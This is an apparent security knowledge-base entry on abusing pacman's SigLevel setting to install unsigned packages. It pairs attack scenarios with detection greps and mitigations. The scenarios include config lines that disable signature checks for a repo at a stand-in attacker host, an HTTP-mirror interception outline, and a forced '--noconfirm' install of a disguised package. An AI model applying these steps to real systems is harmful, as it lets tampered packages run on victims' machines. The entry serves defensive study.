---
name: "Unsigned Package Injection via SigLevel Bypass"
packageManager: "pacman"
slug: "pacman-unsigned-package-injection"
category: "Configuration Abuse"
severity: "high"
platform:
  - "Linux"
description: "Pacman supports package signing via GnuPG to verify that packages originate from trusted packagers. The SigLevel directive in pacman.conf controls signature enforcement per repository. When SigLevel is set to Never, TrustAll, or when PackageRequired/DatabaseRequired are absent, pacman will install packages without verifying signatures. Attackers who can modify pacman.conf, supply a custom repository, or intercept package downloads can inject malicious packages that pacman installs without cryptographic verification."
prerequisites:
  - "Ability to modify /etc/pacman.conf (requires root) or convince a user to add a repository with weak SigLevel settings"
  - "Alternatively, a MITM position on the network if the mirror uses HTTP instead of HTTPS"
  - "A crafted .pkg.tar.zst package file to serve to the victim"
attackScenarios:
  - title: "Disabling Signature Verification via pacman.conf"
    description: "An attacker with root access (or who has compromised an infrastructure automation tool like Ansible) weakens the SigLevel directive to accept unsigned packages. This allows subsequent package installations or updates to install tampered packages without warnings."
    commands:
      - label: "Weakening SigLevel in pacman.conf"
        code: |
          # Original secure configuration
          # SigLevel = Required DatabaseOptional

          # Attacker changes to:
          SigLevel = Never

          # Or per-repository override
          [custom-repo]
          SigLevel = Never
          Server = https://attacker.example.com/$repo/$arch
        language: "ini"
      - label: "Now unsigned packages install without any warning"
        code: |
          # Attacker serves a malicious package from their repo
          pacman -Sy malicious-package
          # No signature verification occurs
        language: "bash"
  - title: "MITM Attack on HTTP Mirror"
    description: "If a pacman mirror is configured over plain HTTP, an attacker in a MITM position can replace package files in transit. Combined with weak SigLevel settings, the tampered package installs without detection."
    commands:
      - label: "Vulnerable mirror configuration in pacman.conf"
        code: |
          # HTTP mirror is vulnerable to MITM
          [core]
          Server = http://mirror.example.com/$repo/os/$arch
        language: "ini"
      - label: "Attacker intercepts and replaces a package during sync"
        code: |
          # Using mitmproxy or bettercap to intercept HTTP traffic
          # Replace the response for a targeted package download
          # with a repackaged version containing a malicious .install scriptlet

          # The victim runs a routine system update
          pacman -Syu
          # Tampered package is installed as if it were legitimate
        language: "bash"
  - title: "Forcing a Local Unsigned Package Install"
    description: "An attacker who has gained limited access tricks a user or script into installing a local package file with the --noconfirm flag, bypassing interactive prompts."
    commands:
      - label: "Installing a malicious local package"
        code: |
          # Attacker places a package in a location the victim will find
          # e.g., in a project directory, disguised as a build dependency
          pacman -U ./dependency-1.0.0-1-x86_64.pkg.tar.zst --noconfirm
        language: "bash"
detection:
  - title: "Audit pacman.conf SigLevel settings"
    description: "Regularly verify that SigLevel is set to require signatures for all repositories."
    commands:
      - code: |
          grep -n 'SigLevel' /etc/pacman.conf
          # Should show: SigLevel = Required DatabaseOptional
          # Alert on: SigLevel = Never, TrustAll, or Optional
        language: "bash"
  - title: "Check for HTTP mirrors"
    description: "Ensure all configured mirrors use HTTPS to prevent MITM attacks on package downloads."
    commands:
      - code: |
          grep -rn 'http://' /etc/pacman.conf /etc/pacman.d/mirrorlist | grep -v '^#'
          # Any non-commented HTTP mirrors are a risk
        language: "bash"
  - title: "Verify package signatures manually"
    description: "Check the signature status of installed packages to detect unsigned or tampered packages."
    commands:
      - code: |
          # Verify a specific package's signature
          pacman -Qi package-name | grep 'Validated By'
          # Should show: Validated By : Signature
          # If it shows: Validated By : None — the package was installed unsigned
        language: "bash"
mitigation:
  - "Always use SigLevel = Required DatabaseOptional (the Arch Linux default) and never weaken it"
  - "Use HTTPS mirrors exclusively — generate mirrorlist with reflector using --protocol https"
  - "Manage pacman.conf with a configuration management tool and monitor for unauthorized changes"
  - "Verify the pacman keyring is up to date with pacman-key --refresh-keys"
  - "Use file integrity monitoring on /etc/pacman.conf and /etc/pacman.d/"
  - "Avoid using pacman -U with untrusted local .pkg.tar.zst files"
references:
  - title: "Arch Wiki - Pacman/Package signing"
    url: "https://wiki.archlinux.org/title/Pacman/Package_signing"
  - title: "Arch Wiki - Pacman - Configuration"
    url: "https://wiki.archlinux.org/title/Pacman#Configuration"
  - title: "man pacman.conf(5) - SigLevel"
    url: "https://man.archlinux.org/man/pacman.conf.5"
created: 2026-04-14
updated: 2026-04-14
---
